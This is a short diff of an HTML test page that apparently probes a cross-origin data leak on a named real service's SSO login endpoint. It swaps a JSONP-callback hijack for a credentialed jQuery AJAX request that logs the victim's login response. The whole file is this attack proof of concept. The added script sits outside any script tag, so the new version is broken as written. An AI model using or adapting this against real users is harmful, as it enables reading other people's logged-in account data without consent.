@@ -1,8 +1,14 @@
 test
 <script type="text/javascript" src="//code.jquery.com/jquery-latest.js"></script>
-<script>
-	function aaaa(data) {
-		console.log(data);
-	}
-</script>
-<script src="https://passport.wanmei.com/sso/login?service=wmshop&jsonpCallback=aaaa"></script>
+$.ajax({
+       url:"https://passport.wanmei.com/sso/login?service=wmshop&jsonpCallback=aaaa",
+       type:"get",
+       data:"",
+        dataType:"json",
+       xhrFields: {
+          withCredentials: true
+       },
+       crossDomain: true,
+      success: function (data) {console.log(data
+      )}
+    });
